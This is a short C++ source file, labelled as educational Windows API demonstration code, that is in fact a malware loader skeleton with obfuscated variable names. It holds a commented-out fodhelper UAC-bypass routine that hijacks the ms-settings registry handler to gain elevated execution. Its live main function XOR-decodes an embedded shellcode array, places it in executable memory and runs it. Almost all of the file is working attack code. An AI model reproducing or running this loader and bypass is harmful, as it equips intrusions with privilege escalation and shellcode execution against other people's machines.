// Coded by 3582-490 for educational purposes only
// This is a demonstration code for learning Windows API concepts
#include <windows.h>
#include <iostream>
#include <shlobj.h>
#include <string>
// fodhelper Bypass UAC technique (commented out)
/* void mason__xa() {
    HKEY mason__xb;
    wchar_t mason__xc[MAX_PATH];
    GetModuleFileNameW(NULL, mason__xc, MAX_PATH);
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &mason__xb, NULL);
    RegSetValueExW(mason__xb, L"", 0, REG_SZ, (BYTE*)mason__xc, (wcslen(mason__xc) + 1) * sizeof(wchar_t));
    RegSetValueExW(mason__xb, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
    ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
    Sleep(3000);
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
}

bool mason__xg() {
    BOOL mason__xh = FALSE;
    SID_IDENTIFIER_AUTHORITY mason__xi = SECURITY_NT_AUTHORITY;
    PSID mason__xj;

    if (AllocateAndInitializeSid(&mason__xi, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &mason__xj)) {
        CheckTokenMembership(NULL, mason__xj, &mason__xh);
        FreeSid(mason__xj);
    }
    return mason__xh; 
} */
int WINAPI WinMain(HINSTANCE mason__xk, HINSTANCE mason__xl, LPSTR mason__xm, int mason__xn) {
     // if (!mason__xg()) {
    //    mason__xa();
   //     return 0;
  //  }
    std::string mason__xd;
    unsigned char mason__xe[] = { 0x42, 0x6A, 0x75, 0xAA, 0xAA, 0x6A, 0x75, 0xAA }; // // Encrypted shellcode with XOR
    unsigned char mason__xf = 0xAA; // XOR key
    for (int mason__xi = 0; mason__xi < sizeof(mason__xe); ++mason__xi) {
        mason__xe[mason__xi] ^= mason__xf;
    }
    void* mason__xj = VirtualAlloc(0, sizeof(mason__xe), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mason__xj, mason__xe, sizeof(mason__xe));
    ((void(*)())mason__xj)();
    return 0;
}
